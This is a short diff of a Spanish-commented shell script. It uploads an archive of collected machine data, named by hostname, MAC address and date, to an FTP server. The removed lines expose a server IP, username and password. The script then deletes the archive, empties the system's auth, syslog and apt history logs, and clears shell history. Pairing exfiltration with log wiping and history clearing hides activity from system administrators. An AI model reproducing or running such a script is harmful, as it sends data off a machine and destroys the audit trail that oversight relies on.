@@ -101,9 +101,9 @@ done
 tar -czvf "${nombre_maquina}-${direccion_mac}-${fecha}.tar.gz" -C "$output_dir" .
 
 # Define las variables
-HOST='143.47.45.198'
-USERNAME='userftp'
-PASSWORD='2Asix'
+HOST=''
+USERNAME=''
+PASSWORD=''
 
 # Puedes agregar otros comandos FTP aquí, como `cd` para cambiar directorios o >
 ftp -n $HOST <<END_SCRIPT
@@ -122,3 +122,4 @@ rm -rf "${nombre_maquina}-${direccion_mac}-${fecha}.tar.gz"
 sudo tee </dev/null /var/log/auth.log 
 sudo tee </dev/null /var/log/syslog 
 sudo tee </dev/null /var/log/apt/history.log 
+history -c
